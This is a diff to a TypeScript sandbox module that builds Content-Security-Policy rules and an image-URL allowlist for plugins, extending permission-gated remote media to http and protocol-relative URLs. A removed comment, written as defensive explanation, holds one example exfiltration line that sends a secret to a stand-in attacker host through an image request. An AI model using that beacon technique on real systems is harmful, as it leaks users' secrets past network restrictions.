@@ -68,8 +68,8 @@ export function escapeSandboxScriptSource(source: string): string {
  * CSP 基础策略片段（不包含 script-src）
  *
  * 安全说明：
- * - 严格限制所有外部资源加载
- * - img-src 允许 HTTPS 图片，以及 data:、blob: 与宿主同源资源
+ * - 严格限制外部资源；远端图/媒体须声明 network:fetch
+ * - connect-src 'none' + 禁用 fetch/XHR/WS 是主动联网边界
  * - 🔒 font-src 允许 data: URI 和 Google Fonts
  * - 🔒 script-src 仅 nonce（Tailwind 在安装时预编译为 CSS 注入，
  *   不加载任何外部脚本源——外部脚本 host 白名单同样是外泄通道）
@@ -88,18 +88,13 @@ export interface GenerateCSPOptions {
    */
   allowWasm?: boolean
   /**
-   * Allow `img-src` / `media-src` to load from arbitrary `https:` origins.
+   * Allow `img-src` / `media-src` to load from remote `https:` / `http:` origins.
    *
    * Granted when the installation has `network:fetch`.
    *
-   * 为什么要用权限门控：`connect-src 'none'` 封掉了 fetch/XHR/WS，但
-   * `img-src https:` 是一条同样好用的**单向外泄通道** ——
-   * `new Image().src = 'https://attacker/?d=' + secret` 就够了，不需要读响应。
-   * 过去它对所有 Tapp 默认开启，于是"沙箱禁止联网"实际上并不成立。
-   *
-   * 现在默认只允许 data:/blob:/宿主同源；确实需要加载远端图片或媒体的 Tapp
-   * 声明 `network:fetch` —— 那本来就是一个用户可见、需要授权的联网能力，
-   * 不会凭空多出攻击面。
+   * 远端封面/头像/CDN 图是正常需求，但须在 manifest 显式声明联网权限，
+   * 由用户安装时授权——不要默认对所有 Tapp 放开，也不要用图片代理折中。
+   * （connect-src 仍为 'none'：Tapp 不能随意 fetch；远程图是单向加载。）
    */
   allowRemoteMedia?: boolean
 }
@@ -139,15 +134,14 @@ export function generateCSP(
     ? `script-src 'nonce-${nonce}'${wasmPart}`
     : `script-src 'unsafe-inline'${wasmPart}`
 
-  // 图片/媒体源。
+  // 图片 / 媒体源。
   //
-  // 默认只放行 data:/blob:/宿主同源 —— 宿主源覆盖包内资源、`/api/proxy/image`
-  // 与 Federation Note 附件（`/media/federation/*`），本地 HTTP 开发环境也走这里。
-  // 裸 `https:` 是一条外泄通道（见 GenerateCSPOptions.allowRemoteMedia），
-  // 只在 Tapp 声明了 network:fetch 时才追加。
+  // 默认只放行 data:/blob:/宿主同源。裸 https:/http: 挂在 network:fetch：
+  // 需要外链封面、CDN 图、远程音视频的 Tapp 在 manifest 声明该权限即可。
+  // 不要默认全开，也不要逼宿主走 /api/proxy/image 折中。
   const origin = hostOrigin()
   const originPart = origin ? ` ${origin}` : ''
-  const remotePart = allowRemoteMedia ? ' https:' : ''
+  const remotePart = allowRemoteMedia ? ' https: http:' : ''
 
   const imgSrc = `img-src data: blob:${remotePart}${originPart}`
   // video/audio: blob/data 仅在 media:audio 授权时放行
@@ -181,7 +175,7 @@ export function cspOptionsFromPermissions(
   return {
     allowMediaBlob: grantedPermissions?.includes('media:audio') === true,
     allowWasm: true,
-    // 远端 https 图片/媒体挂在已有的联网权限下，而不是对所有 Tapp 默认开启
+    // 远端 https/http 图片与媒体均须 network:fetch（manifest 声明 + 用户授权）
     allowRemoteMedia: grantedPermissions?.includes('network:fetch') === true,
   }
 }
@@ -204,8 +198,7 @@ export function cspOptionsFromPermissions(
  * 6. 图片 URL 白名单与 CSP img-src 对齐（尽早报错，非边界）
  *
  * @param sessionToken 会话 token，用于消息验证
- * @param allowRemoteMedia 是否放行远端 https 图片（须与 generateCSP 的同名选项一致，
- *        否则这里的提示会与实际被 CSP 拦截的结果对不上）
+ * @param allowRemoteMedia 是否放行远端 http(s) 图片（须与 generateCSP 同名选项一致）
  */
 export function generateSecurityWrapper(
   sessionToken: string,
@@ -387,8 +380,7 @@ export function generateSecurityWrapper(
   window.SharedWorker = class { constructor() { throw new Error('SharedWorker is disabled in Tapp sandbox'); } };
   
   // 图片 URL 白名单：与 CSP img-src 对齐。
-  // 默认允许 data:、blob:、宿主同源与宿主相对路径；
-  // 裸 https: 只有在 Tapp 声明 network:fetch 时才放行（否则它是外泄通道）。
+  // 默认 data:/blob:/宿主同源；裸 http(s) 仅在已授予 network:fetch 时放行。
   const _HOST_ORIGIN = '${origin}';
   const _ALLOW_REMOTE_MEDIA = ${allowRemote};
   const _isAllowedImageUrl = (value) => {
@@ -397,8 +389,14 @@ export function generateSecurityWrapper(
     if (!v) return true;
     const lower = v.toLowerCase();
     if (lower.startsWith('data:') || lower.startsWith('blob:')) return true;
-    if (_ALLOW_REMOTE_MEDIA && lower.startsWith('https://')) return true;
-    // Host-origin only (align with CSP img-src). Relative // is protocol-relative → blocked.
+    if (
+      _ALLOW_REMOTE_MEDIA &&
+      (lower.startsWith('https://') ||
+        lower.startsWith('http://') ||
+        lower.startsWith('//'))
+    ) {
+      return true;
+    }
     if (_HOST_ORIGIN) {
       const host = _HOST_ORIGIN.toLowerCase();
       if (
